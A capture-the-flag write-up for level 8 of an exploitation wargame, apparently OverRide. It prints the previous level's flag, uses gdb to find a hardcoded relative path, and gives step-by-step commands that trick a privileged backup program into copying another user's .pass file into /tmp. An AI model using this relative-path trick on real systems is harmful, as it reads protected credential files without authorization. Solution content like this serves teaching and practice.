[README](../README.md)
# Level08
previous flag: `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`


## disas main
- <+95> : argument for fopen is prepared and we find out that it's an hardcoded relative (not absolute) path:
```
(gdb) x/s 0x400d6d
0x400d6d:	 "./backups/.log"
```

## vulnerability
- if we try to pass as argument the hardcoded path we have an error. It seems to be trying to open a file at the given path, but it's failing because the path is relative, not absolute.:
```
level08@OverRide:~$ ./level08 ./backups/.log
ERROR: Failed to open ./backups/./backups/.log
```
- The error message suggests that the program is trying to open a file in a backups directory that's located in the same directory as the program itself
- if we check the backups file and cat the .log we find that it contains the path to the .pass we want to cat:
```
cd ./backups/
level08@OverRide:~/backups$ ls
level08@OverRide:~/backups$ ls -la
total 4
drwxrwx---+ 1 level09 users    60 Oct 19  2016 .
dr-xr-x---+ 1 level08 level08 100 Oct 19  2016 ..
-rwxrwx---+ 1 level09 users    49 Apr 30 00:05 .log
level08@OverRide:~/backups$ cat .log
LOG: Starting back up: /home/users/level09/.pass
```
## Solution
- since the program takes a relative path we can make it believe that we are in the home of user09 recreating the same file system structure in the only place where we have the privileges to do that, /tmp.
1. `cd /tmp` 
2. `mkdir -p ./backups/home/users/level09/`
from /tmp we launch the executable with the .pass we need. Because the program uses relative paths, it creates a backup of the password file in the backups directory that we created in /tmp.:
3. `~/level08 /home/users/level09/.pass`
we cat the backup that we created
4. `cat ./backups/home/users/level09/.pass`

